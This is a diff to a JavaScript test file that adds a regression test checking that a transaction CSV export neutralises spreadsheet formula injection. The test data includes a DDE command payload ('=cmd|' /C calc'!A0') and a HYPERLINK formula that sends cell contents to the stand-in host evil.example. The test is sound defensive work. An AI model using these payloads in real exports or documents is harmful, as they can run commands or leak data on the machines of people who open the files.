@@ -64,3 +64,14 @@ test("reference cells that a spreadsheet would evaluate as a formula are neutral
   assert.equal(references[5], "order-1001", "ordinary references are unchanged");
   assert.ok(csv.includes('"\'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"'), csv);
 });
+
+// Regression: a reference starting with a line feed ("\n=...") was not
+// prefixed (only tab/CR were), and a ";" did not force quoting, so a
+// ";"-separator spreadsheet split the cell and evaluated the "=" part.
+test("a leading line feed is neutralised and a semicolon forces quoting", async () => {
+  const merchantId = await merchantWithReferences(["\n=cmd|' /C calc'!A0", "a;=HYPERLINK(1)"]);
+  const csv = await buildTransactionsExportCsv(pool, { merchantId });
+
+  assert.ok(csv.includes(`,"'\n=cmd|' /C calc'!A0",`), JSON.stringify(csv));
+  assert.ok(csv.includes(`,"a;=HYPERLINK(1)",`), JSON.stringify(csv));
+});
